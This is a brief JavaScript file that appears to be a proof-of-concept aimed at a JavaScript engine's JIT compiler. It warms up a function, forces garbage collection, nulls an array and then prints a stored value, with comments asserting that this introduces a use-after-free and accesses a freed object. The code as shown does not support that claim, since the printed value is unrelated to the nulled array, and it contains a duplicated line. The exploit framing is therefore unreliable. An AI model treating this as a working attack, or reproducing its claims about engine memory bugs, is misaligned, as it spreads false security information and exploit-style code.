function gc() {
    for (let i = 0; i < 10; i++) {
        new ArrayBuffer(1024 * 1024 * 10);
    }
}

function opt(arr) {
    let r = /a/;
    let o = {};

    arr[0].charAt(0);
    arr[1].charAt(0);
    arr[2].charAt(0);
    arr[3].charAt(0);
    arr[4].charAt(0);
    arr[5].charAt(0);
    arr[6].charAt(0);
    arr[7].charAt(0);
    arr[8].charAt(0);
    arr[8].charAt(0);
    arr[9].charAt(0);

    o.x = 'a'.match(r);

    return o;
}

function main() {
    for (let i = 0; i < 10000; i++) {
        opt(['a' + i, 'b' + i, 'c' + i, 'd' + i, 'e' + i, 'f' + i, 'g' + i, 'h' + i, 'i' + i, 'j' + i]);
    }

    let a = 'a'.repeat(1024 * 1024 * 2);
    let b = 'a'.repeat(1024 * 1024 * 2);

    let arr = [];
    for (let i = 0; i < 10; i++) {
        arr[i] = a + b;
    }

    gc();

    let o = opt(arr);

    // Introduce Use After Free vulnerability
    arr = null;

    gc();

    let tmp = [1234];

    print(o.x);  // Accessing a freed object - potential for exploitation
}

main();
